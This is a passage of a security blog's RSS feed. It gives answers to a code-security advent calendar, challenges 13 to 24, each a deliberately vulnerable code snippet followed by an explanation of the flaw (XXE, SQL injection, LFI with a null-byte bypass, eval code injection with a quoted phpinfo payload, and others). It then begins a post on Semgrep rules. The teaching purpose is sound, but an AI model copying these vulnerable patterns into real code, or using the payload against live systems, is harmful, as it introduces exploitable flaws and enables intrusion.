            DateTime.TryParseExact(since, &quot;MM-dd-yy&quot;, null,
                DateTimeStyles.None, out var parsedDate);
            var blogposts = from BlogPost blog in Posts
                where DateTime.Compare(blog.ReleaseDate, parsedDate) &amp;gt; 0
                select blog.Content;
            ArrayList result = new ArrayList();
            foreach (var content in blogposts) {
                String tmp = content.Replace(Keyword, search);
                Regex rx = new Regex(search);
                Match match = rx.Match(tmp);
                if(match.Success) {
                    result.Add(match.Value);
                }
            }
            return result;
        }
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;A &lt;strong&gt;Reject Injection/ReDoS&lt;/strong&gt; vulnerability exists in the above code. The &lt;code class=&quot;highlighter-rouge&quot;&gt;search&lt;/code&gt; argument is provided by user input. This is then provided to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Regex&lt;/code&gt; constructor and the user provided input is used for the regex match. An attacker could provide a large regex which could lead to backtracking when eveluating with &lt;code class=&quot;highlighter-rouge&quot;&gt;Regex&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;challenge-13httpstwittercomsonarsourcestatus1338151696439107584&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1338151696439107584&quot;&gt;Challenge 13&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
import requests
import errno
from django.conf import settings
class Sitemap():
    domain = &quot;sonarsource.com&quot;
    def __init__(self, filename=&quot;sitemap.xml&quot;):
	self.url = &quot;http://&quot; + self.domain
        if not self.url.endswith('/'):
            self.url += '/'
        self.url += filename
        self.destination = os.path.join(settings.STATIC_ROOT, filename)
	
    def fetch(self, dataset=None):
        headers = {'User-Agent': 'Mozilla/5.0 Chrome/50.2661 Safari/537.36'}
        try:
            response = requests.get(self.url, timeout=30, headers=headers)
        except requests.exceptions.SSLError:
            response = requests.get(self.url, verify=False, headers=headers)
        finally:
            pass
        with open(self.destination, 'wb') as f:
            f.write(response.content)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Two issues exist in the above code:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://&lt;/code&gt; protocol URI is used as the URL that will be used by &lt;code class=&quot;highlighter-rouge&quot;&gt;requests.get&lt;/code&gt;. &lt;strong&gt;Usage of Plain text protocols&lt;/strong&gt;** are considered bad practice.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;verify=False&lt;/code&gt; option is set for &lt;code class=&quot;highlighter-rouge&quot;&gt;requests.get&lt;/code&gt;. This is disables server certificate validation and is considered to be &lt;strong&gt;Insecure Configuration&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;challenge-14httpstwittercomsonarsourcestatus1338514090755440641&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1338514090755440641&quot;&gt;Challenge 14&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Properties;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
public class IndexServlet {
    private final ServletContext context;
    private final String templateFile = &quot;/org/java/repository.xml&quot;;
        
    public IndexServlet(ServletContext context) {
        this.context = context;
    }
    
    public void installRepository(HttpServletRequest req)
            throws ServletException, IOException {
        String mode = req.getParameter(&quot;mode&quot;);
        String repHome = req.getParameter(&quot;repository_home&quot;);
        if (repHome != null &amp;amp;&amp;amp; mode != null &amp;amp;&amp;amp; &quot;new&quot;.equals(mode)) {
            installConfig(new File(repHome));
        }
    }
    private void installConfig(File dest) throws IOException {
        InputStream in = context.getResourceAsStream(templateFile);
        OutputStream out = new FileOutputStream(dest);
        byte[] buffer = new byte[8192]; int read;
        while ((read = in.read(buffer)) &amp;gt;= 0) {
            out.write(buffer, 0, read);
        }
        in.close();
        out.close();
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Tainted source is flowing from &lt;code class=&quot;highlighter-rouge&quot;&gt;req.getParameter(&quot;repository_home&quot;);&lt;/code&gt;, this is the provided to the &lt;code class=&quot;highlighter-rouge&quot;&gt;new File&lt;/code&gt; constructor and flows to the &lt;code class=&quot;highlighter-rouge&quot;&gt;installConfig&lt;/code&gt; method. The user input then flows to the &lt;code class=&quot;highlighter-rouge&quot;&gt;FileOutputStream(dest)&lt;/code&gt; method which creates a new file in the give file path, resulting in &lt;strong&gt;Arbritary File Write&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;challenge-15httpstwittercomsonarsourcestatus1338868922225856516&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1338868922225856516&quot;&gt;Challenge 15&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
if ('restore' == $_GET['action']) {
    $upload = $_FILES['filename'];
    $upload_tmp = $_FILES['filename']['tmp_name'];
    $upload_name = $_FILES['filename']['name'];
    $upload_error = $_FILES['filename']['error'];
    if ($upload_error &amp;gt; 0) {
        switch ($upload_error) {
            case UPLOAD_ERR_INI_SIZE:
                break;
            default:
                echo sprintf(&quot;Error %s&quot;, $upload_error);
        }
    }
    if (!$upload_name &amp;amp;&amp;amp; isset($_POST['file'])) {
    $upload_name = filter_input(INPUT_POST,'file',FILTER_SANITIZE_STRING);
    } else {
        $ret_val = do_upload($upload_tmp, $upload_name);
    }
    echo '&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;restore from ' . $upload_name . '&amp;lt;/b&amp;gt;';
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Multiple issues exist in the above code:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;An &lt;strong&gt;Insufficient Validation&lt;/strong&gt; issue exists where a file with any extension can be uploaded&lt;/li&gt;
  &lt;li&gt;Two &lt;strong&gt;Cross-site Scripting (XSS)&lt;/strong&gt; issues exist. One within the &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; sink where &lt;code class=&quot;highlighter-rouge&quot;&gt;$upload_error&lt;/code&gt; is reflected back a a user. Another XSS exists where &lt;code class=&quot;highlighter-rouge&quot;&gt;$upload_name&lt;/code&gt; is reflected back to a user in the &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; statement.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;challenge-16httpstwittercomsonarsourcestatus1339226778477285376&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1339226778477285376&quot;&gt;Challenge 16&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using System;
using System.IO;
using System.Xml;
using System.Xml.Serialization;
using Microsoft.AspNetCore.Mvc;
[Serializable]
public class ExchangeData {
}
namespace core_api.Controllers {
    public class ShareDataController : Controller {
        [Route(&quot;import/exchange&quot;)] 
        [HttpPost]
        public string ImportExchangeData(string content) {
            var xmlDoc = new XmlDocument { XmlResolver = null };
            xmlDoc.LoadXml(content); 
            var rootItem = (XmlElement)xmlDoc.SelectSingleNode(&quot;root&quot;);
            var dataType = Type.GetType(rootItem.GetAttribute(&quot;data&quot;));
            var reader = new StringReader(rootItem.InnerXml);
            ExchangeData exchange = Import(dataType, reader);
            return exchange.ToString();
        }
        private static ExchangeData Import(Type t, StringReader r) {
            XmlSerializer serializer = new XmlSerializer(t);
            XmlTextReader textReader = new XmlTextReader(r);
            ExchangeData data = (ExchangeData)serializer.Deserialize(textReader);
            return data;
        }
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;An &lt;strong&gt;Unsafe Deserialization&lt;/strong&gt; vulnerability exists in the above code. &lt;code class=&quot;highlighter-rouge&quot;&gt;XmlSerializer&lt;/code&gt; is used to deserialize user object provided by the &lt;code class=&quot;highlighter-rouge&quot;&gt;content&lt;/code&gt; argument. For &lt;code class=&quot;highlighter-rouge&quot;&gt;XmlSerializer&lt;/code&gt; serializer, the expected type should not come from user-controlled input. In the above code, the expected data type is coming from &lt;code class=&quot;highlighter-rouge&quot;&gt;rootItem.GetAttribute(&quot;data&quot;)&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;challenge-17httpstwittercomsonarsourcestatus1339586153545150464&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1339586153545150464&quot;&gt;Challenge 17&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import copy
import io
from http import HTTPStatus
from zipfile import ZipFile
from flask import Blueprint, current_app, jsonify, request, send_file
@FIXTURE_BLUEPRINT.route('/api/export/&amp;lt;business_id&amp;gt;', methods=['GET'])
def get(business_id, table=None):
    con = current_app.config.get('DB_CONNECTION', None)
    if not con:
        current_app.logger.error('Database connection failure')
        return jsonify({'message': 'Database connection error'})
    cur = con.cursor()
    bid = _get_business_id(cur=cur, business_id=business_id)
    if not bid:
        current_app.logger.error(f'{business_id} not found')
        return jsonify({'message': f'Could not find {business_id}.'})
    try:
        tmp_file = _create_export(cur=cur, table=table, bid=bid)
        if not tmp_file:
            return jsonify({'message': f'Failed to create export for {bid}'})
        current_app.logger.error(f'DELETE: {tmp_file}')
        return send_file(attachment_filename=tmp_file, as_attachment=True)
    except Exception as err:
        current_app.logger.error(f'Failed to export')
        con.reset()
        return jsonify({'message': 'Failed to export data.'})

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A &lt;strong&gt;&lt;a href=&quot;https://owasp.org/www-community/attacks/Log_Injection&quot;&gt;Log Injection&lt;/a&gt;&lt;/strong&gt; vulnerability exists where data source coming from &lt;code class=&quot;highlighter-rouge&quot;&gt;business_id&lt;/code&gt; is validated and if it doesn‚Äôt exist, this is logged into the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_app.logger.error&lt;/code&gt; method directly. An attacker could inject CRLF characters (&lt;code class=&quot;highlighter-rouge&quot;&gt;%0D%0A&lt;/code&gt;) and adding additional log entries.&lt;/p&gt;

&lt;h3 id=&quot;challenge-18httpstwittercomsonarsourcestatus1339956086237929474&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1339956086237929474&quot;&gt;Challenge 18&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package org.example;
import javax.servlet.ServletException;
import javax.servlet.http.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import org.jdom2.Content;
import org.jdom2.Document;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
public class IndexServlet extends HttpServlet {
    private String extractContent() throws IOException, JDOMException {
        File uploadFile = new File(&quot;/users/upload/document.odt&quot;);
        InputStream in = new FileInputStream(uploadFile);
        final ZipInputStream zis = new ZipInputStream(in);
        ZipEntry entry;
        List&amp;lt;Content&amp;gt; content = null;
        while ((entry = zis.getNextEntry()) != null) {
            if (entry.getName().equals(&quot;content.xml&quot;)) {
                final SAXBuilder sax = new org.jdom2.input.SAXBuilder();
                Document doc = sax.build(zis);
                content = doc.getContent();
                StringBuilder sb = new StringBuilder();
                if (content != null) {
                    for (Content item : content) {
                        sb.append(item.getValue());
                    }
                }
                zis.close();
                return sb.toString();
            }
        }
        return null;
    }
    protected void doGet(HttpServletRequest req, HttpServletResponse res)
        throws ServletException, IOException
    {
        try {
            extractContent();
        }
        catch(Exception e) {
            return;
        }
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;org.jdom2.input.SAXBuilder&lt;/code&gt; is used to parse an &lt;code class=&quot;highlighter-rouge&quot;&gt;.odt&lt;/code&gt; file. An &lt;code class=&quot;highlighter-rouge&quot;&gt;.odt&lt;/code&gt; file contains XML files will be parsed by &lt;code class=&quot;highlighter-rouge&quot;&gt;SAXBuilder&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;content.xml&lt;/code&gt; in this example. In the above example, &lt;code class=&quot;highlighter-rouge&quot;&gt;SAXBuilder&lt;/code&gt; is set without &lt;code class=&quot;highlighter-rouge&quot;&gt;builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);&lt;/code&gt; which provides an attack vector for &lt;strong&gt;XML External Entity (XXE)&lt;/strong&gt;. An attacker could modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;content.xml&lt;/code&gt; to have external entities.&lt;/p&gt;

&lt;h3 id=&quot;challenge-19httpstwittercomsonarsourcestatus1340326027206209539&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1340326027206209539&quot;&gt;Challenge 19&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
namespace App\Http\Controllers;
use Illuminate\Support\Facades\Request;
use Illuminate\Support\Facades\Response;
use Illuminate\Http\RedirectResponse;
class LessonsController6 extends ApiController {
    public function load(): RedirectResponse {
        if (!empty(Request::cookie('site'))) {
            $site_id = Request::cookie('site');
        } else if (!empty(Request::getHost())) {
            $site_id = Request::getHost();
        } else {
            $site_id = 'default';
        }
        if (empty($site_id) || preg_match('/[^A-Za-z0-9.-_]/', $site_id)) {
            abort(403, 'Invalid ID ' . htmlspecialchars($site_id, ENT_NOQUOTES));
        }
        require_once &quot;sites/$site_id.php&quot;;
        if ($config == 1) {
            return redirect()-&amp;gt;route('login', ['site' =&amp;gt; $site_id]);
        } else {
            return redirect()-&amp;gt;route('setup', ['site' =&amp;gt; $site_id]);
        }
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A &lt;strong&gt;Local File Inclusion&lt;/strong&gt; exists in the above code. It is possible to set an arbritary path through a host header &lt;code class=&quot;highlighter-rouge&quot;&gt;(Request::getHost()&lt;/code&gt; or a Cookie &lt;code class=&quot;highlighter-rouge&quot;&gt;Request::cookie('site')&lt;/code&gt;, The regex used by the code (&lt;code class=&quot;highlighter-rouge&quot;&gt;[^A-Za-z0-9.-_]&lt;/code&gt;) does not validate &lt;code class=&quot;highlighter-rouge&quot;&gt;../../&lt;/code&gt; and this &lt;code class=&quot;highlighter-rouge&quot;&gt;$siteid&lt;/code&gt; is provided to &lt;code class=&quot;highlighter-rouge&quot;&gt;require_once &quot;sites/$site_id.php&quot;;&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension can be bypassed using a null byte (&lt;code class=&quot;highlighter-rouge&quot;&gt;%00&lt;/code&gt;).&lt;/p&gt;

&lt;h3 id=&quot;challenge-20httpstwittercomsonarsourcestatus1340688412450414592&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1340688412450414592&quot;&gt;Challenge 20&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using System;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Cryptography;
using Microsoft.AspNetCore.Mvc;
using Microsoft.IdentityModel.Tokens;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;
namespace core_api.Controllers
{
    public class ApiController : Controller
    {
        private readonly string publicKey;        
	private readonly string authTokenIssuer;
        
        public ApiController(string publicKey, string authTokenIssuer)     
        {
            this.publicKey = publicKey;
            this.authTokenIssuer = authTokenIssuer;
        }
        
        private String ExportPublicKey(RSACryptoServiceProvider rsa)
        {
            throw new NotImplementedException();
        }
        private RSACryptoServiceProvider ImportKeyParameters(string publicKey)
        {
            throw new NotImplementedException();
        }
	    
        public JwtSecurityToken ValidateToken(string token) {           
            byte[] keyBytes = Convert.FromBase64String(publicKey);
            var keyParams = (RsaKeyParameters)PublicKeyFactory.CreateKey(keyBytes);
            var rsaParams = new RSAParameters {
                Modulus = keyParams.Modulus.ToByteArrayUnsigned(),
                Exponent = keyParams.Exponent.ToByteArrayUnsigned() 
            };
            var rsa = new RSACryptoServiceProvider();
            rsa.ImportParameters(rsaParams);
            rsa.KeySize = 4096;
            var validationParameters = new TokenValidationParameters {
                RequireExpirationTime = true,
                RequireSignedTokens = true,
                ValidIssuer = authTokenIssuer,
                ValidateIssuer = true,
                ValidateLifetime = true,
                IssuerSigningKey = new RsaSecurityKey(rsa)
            };
            var handler = new JwtSecurityTokenHandler();
            handler.ValidateToken(token, validationParameters, out SecurityToken validatedSecurityToken);
            var validatedJwt = validatedSecurityToken as JwtSecurityToken;
            return validatedJwt;
        }       
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above code is an example of &lt;strong&gt;Insecure Cryptography&lt;/strong&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;RSACryptoServiceProvider&lt;/code&gt; constructor by default sets the key size to be &lt;code class=&quot;highlighter-rouge&quot;&gt;1024&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;rsa.KeySize = 4096;&lt;/code&gt; assingment does not change the keysize according to the SonarSource expected solution.&lt;/p&gt;

&lt;h3 id=&quot;challenge-21httpstwittercomsonarsourcestatus1341035697734561792&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1341035697734561792&quot;&gt;Challenge 21&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
import tempfile
'''
Open the pdf reader on windows for the report file
'''
def open_report(report_class, _system=&quot;Windows&quot;, *args, **kwargs):
    rv = PrintReportEvent.emit(report_class, *args, **kwargs)
    if rv:
        return rv
    filters = kwargs.pop('filters', None)
    if filters:
        kwargs = describe_search_filters_for_reports(filters, **kwargs)
    tmp = tempfile.mktemp(suffix='.pdf', prefix='stoqlib-reporting')
    report = report_class(tmp, *args, **kwargs)
    report.filename = tmp
    if _system == &quot;Windows&quot;:
        report.save()
        log.info(&quot;Executing PDF reader with %r&quot; % (report.filename, ))
        os.startfile(report.filename)
        return
    if isinstance(report, HTMLReport):
        op = PrintOperationWEasyPrint(report)
        op.set_threaded()
    else:
        op = PrintOperationPoppler(report)
    rv = op.run()
    return rv


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The issue here arises from the &lt;code class=&quot;highlighter-rouge&quot;&gt;tempfile.mktemp&lt;/code&gt; function being used which allows for potential &lt;strong&gt;Race Condition&lt;/strong&gt;. An attacker could create a file of his choice before the &lt;code class=&quot;highlighter-rouge&quot;&gt;mktemp&lt;/code&gt; is triggered by an user.  The following stackoverflow explains this vulnerability: &lt;a href=&quot;https://stackoverflow.com/questions/37093444/using-python-tempfiles-permanently&quot;&gt;Stackoverflow - using-python-tempfiles-permanently&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;challenge-22httpstwittercomsonarsourcestatus1341035697734561792&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1341035697734561792&quot;&gt;Challenge 22&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.example.restservice;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;
import org.hibernate.criterion.Restrictions;
import org.hibernate.criterion.Criterion;
import org.hibernate.type.StringType;
@Controller
@RequestMapping(&quot;/nodeList.htm&quot;)
public class NodeListController {
    public NodeListModel createNodeList(NodeListCommand command) {
        NodeCriteria criteria = new NodeCriteria(Node.class, &quot;node&quot;);
        addNodeCriteria(criteria, command.getNodeParm(), command.getNodeParmValue());
        return createModel(command);
    }
    @RequestMapping(method={ RequestMethod.GET, RequestMethod.POST })
    public ModelAndView handle(@ModelAttribute(&quot;command&quot;) NodeListCommand command) {
        NodeListModel model = createNodeList(command);
        ModelAndView modelAndView = new ModelAndView(&quot;nodeList&quot;, &quot;model&quot;, model);
        return modelAndView.addObject(&quot;command&quot;, command);
    }
    private static void addNodeCriteria(NodeCriteria criteria,
            String nodeParm, String nodeParmValue) {
        final String nodeParameterName = (&quot;snmp&quot; + nodeParm).toLowerCase();    
        criteria.add(Restrictions.sqlRestriction(nodeParameterName + &quot; = ?)&quot;, 
            nodeParmValue, new StringType()));       
        criteria.createAlias(nodeParm, nodeParameterName);    
    }
    
    private NodeListModel createModel(NodeListCommand command) {
        return new NodeListModel();
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A &lt;strong&gt;SQL Injection&lt;/strong&gt; exists in the above code. Tainted data is flowing from source &lt;code class=&quot;highlighter-rouge&quot;&gt;@ModelAttribute(&quot;command&quot;) NodeListCommand command&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt; argument is then sent to the &lt;code class=&quot;highlighter-rouge&quot;&gt;createNodeList&lt;/code&gt; method. The &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt; then flows to the &lt;code class=&quot;highlighter-rouge&quot;&gt;addNodeCriteria&lt;/code&gt; method. The &lt;code class=&quot;highlighter-rouge&quot;&gt;nodeParm&lt;/code&gt; argument from the &lt;code class=&quot;highlighter-rouge&quot;&gt;addNodeCriteria&lt;/code&gt; method is then concentated to the &lt;code class=&quot;highlighter-rouge&quot;&gt;nodeParameterName&lt;/code&gt; variable: final String &lt;code class=&quot;highlighter-rouge&quot;&gt;nodeParameterName = (&quot;snmp&quot; + nodeParm).toLowerCase();&lt;/code&gt;. This then added to the &lt;code class=&quot;highlighter-rouge&quot;&gt;createAlias&lt;/code&gt; HQL sink via &lt;code class=&quot;highlighter-rouge&quot;&gt;criteria.add&lt;/code&gt;resulting in SQL injection.&lt;/p&gt;

&lt;h3 id=&quot;challenge-23httpstwittercomsonarsourcestatus1341775576986742784&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1341775576986742784&quot;&gt;Challenge 23&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php 
class email_output_html {
    protected function express($expression) {
        $expression = preg_replace(
            array('/env:([a-z0-9_]+)/i',
                '/config:([a-z0-9_]+)(:(\S+))?/i',
            ),
            array(&quot;(isset(\$this-&amp;gt;env['\\1']) ? \$this-&amp;gt;env['\\1'] : null)&quot;,
                &quot;\$this-&amp;gt;config-&amp;gt;get('\\1', '\\3')&quot;,
            ),
            $expression
        );
        return eval(&quot;return ($expression);&quot;);
    }
    protected function parse_template() {
        $attributes  = html::parse_attrib_string($_POST['_mail_body']);
        foreach($attributes as $attrib) {
            if (!empty($attrib['express'])) {
                $attrib['c'] = $this-&amp;gt;express($attrib['express']);
            }
            if (!empty($attrib['name']) || !empty($attrib['command'])) {
                $attrib['c'] = $this-&amp;gt;button($attrib);
            }
        }
    }
}
class html {
    public static function parse_attrib_string($str) {	
        $attrib = array();
        preg_match_all('/\s*([-_a-z]+)=([&quot;\'])??(?(2)([^\2]*)\2|(\S+?))/Ui', $str, $regs, PREG_SET_ORDER);
		
        if ($regs) {
            foreach ($regs as $attr) {
                $attrib[strtolower($attr[1])] = html_entity_decode($attr[3] . $attr[4]);
            }
        }
        return $attrib;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A &lt;strong&gt;Code Injection&lt;/strong&gt; exists due to the usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt;. User input is flowing from the &lt;code class=&quot;highlighter-rouge&quot;&gt;parse_template&lt;/code&gt; function to the &lt;code class=&quot;highlighter-rouge&quot;&gt;express&lt;/code&gt; function as follows: &lt;code class=&quot;highlighter-rouge&quot;&gt;express($attrib['express']&lt;/code&gt; I wasn‚Äôt able to find a bypass for the regex used within the &lt;code class=&quot;highlighter-rouge&quot;&gt;parse_template&lt;/code&gt; function; the SonarSource expected solution states that the following  payload can be used: &lt;code class=&quot;highlighter-rouge&quot;&gt;/config:sonar:'.phpinfo().'&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;challenge-24httpstwittercomsonarsourcestatus1342122866440101889&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1342122866440101889&quot;&gt;Challenge 24&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Reflection;
namespace core_api
{
    public partial class Form1 : Form
    {
        const int MAX_PATH = 10;
        public Form1()
        {
            InitializeComponent();
        }
        private void btnInstallPackage_Click(object sender, EventArgs e) {
            InstallPackage(txtPackage.Text, CurrentProject.ProjectDirectory);
        }
        public static void InstallPackage(string packageId, string workingDir) {
            string dir = Path.Combine(workingDir, &quot;nuget&quot;);
            dir = Path.Combine(dir, packageId).Substring(0, MAX_PATH);
            Directory.CreateDirectory(dir);
            Process nuget = new Process();
            nuget.StartInfo.FileName = Path.Combine(Tools.GetPath(), &quot;nuget&quot;);
            nuget.StartInfo.Arguments = &quot;install &quot;+packageId+&quot; -NonInteractive&quot;;
            nuget.StartInfo.CreateNoWindow = true;
            nuget.StartInfo.RedirectStandardOutput = true;
            nuget.StartInfo.RedirectStandardError = true;
            nuget.StartInfo.WorkingDirectory = dir;
            nuget.StartInfo.StandardOutputEncoding = System.Text.Encoding.UTF8;
            nuget.StartInfo.UseShellExecute = false;
            nuget.Start();
        }
    }
    class Tools
    {
        public static string GetPath()
        {
            return &quot;D:\\test\\VisualNuget\\nuget&quot;;
        }
    }
    class CurrentProject
    {
        public static string ProjectDirectory = &quot;D:\\test\\VisualNuget&quot;;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The issue here arisies from the &lt;code class=&quot;highlighter-rouge&quot;&gt;InstallPackage&lt;/code&gt; method taking a &lt;code class=&quot;highlighter-rouge&quot;&gt;packageId&lt;/code&gt; parameter. This parameter is concentated into the arguments :&lt;code class=&quot;highlighter-rouge&quot;&gt;nuget.StartInfo.Arguments = &quot;install &quot;+packageId+&quot; -NonInteractive&quot;;&lt;/code&gt;and is ran as part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;nuget&lt;/code&gt; command. It is not possible to conduct a Command Injection attack due to user input only ending up in &lt;code class=&quot;highlighter-rouge&quot;&gt;nuget.StartInfo.Arguments&lt;/code&gt; but &lt;strong&gt;Argument Injection&lt;/strong&gt; is possible and run the command with additional arguments that the binary wasn‚Äôt expecting.&lt;/p&gt;
</description>
        <pubDate>Mon, 28 Dec 2020 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/web-application-security/2020/12/28/code-security-advent-calendar-answers.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web-application-security/2020/12/28/code-security-advent-calendar-answers.html</guid>
        
        
        <category>web-application-security</category>
        
      </item>
    
      <item>
        <title>Writing AngularJS Security Semantic Rules using Semgrep</title>
        <description>&lt;p&gt;AngularJS Security is something I have looked into in the past. In 2016, I conducted a workshop on AngularJS Security in MWR‚Äôs MWRICON which highlighted some common security issues and how they could be exploited. The materials of this workshop can be seen here: &lt;a href=&quot;https://github.com/snoopysecurity/Public/tree/master/Old%20Presentations/MWRICON%202018&quot;&gt;MWRICON 2018&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I recently took notice of Semgrep which is a Lightweight static analysis tool. &lt;a href=&quot;https://semgrep.dev/&quot;&gt;Semgrep&lt;/a&gt; is an interesting tool for code reviewers which is more expressive than grep, and is easily customizable to conduct semantic analysis. Since Semgrep is lightweight and fast, it is easy to implement this in a CI/CI pipeline.&lt;/p&gt;

&lt;h3 id=&quot;semgrep&quot;&gt;Semgrep&lt;/h3&gt;

&lt;p&gt;Semgrep is fairly easy to setup and install &lt;code class=&quot;highlighter-rouge&quot;&gt;pip3 install semgrep&lt;/code&gt;. Furthermore, the &lt;a href=&quot;https://semgrep.dev/editor&quot;&gt;Semgrep Live Editor&lt;/a&gt; can also be used to write and save rules on r2c‚Äôs system.&lt;/p&gt;

&lt;p&gt;Semgrep uses &lt;a href=&quot;https://github.com/facebookarchive/pfff&quot;&gt;pfff&lt;/a&gt; (PHP Frontend For Fun) which is a static analysis engine previously developed by facebook and was then deprecated. 
The developer Yoann Padioleau who initially wrote this now works for r2c. pfff is written in OCaml and it is a set of modules (only few are used as part Semgrep I think).&lt;/p&gt;

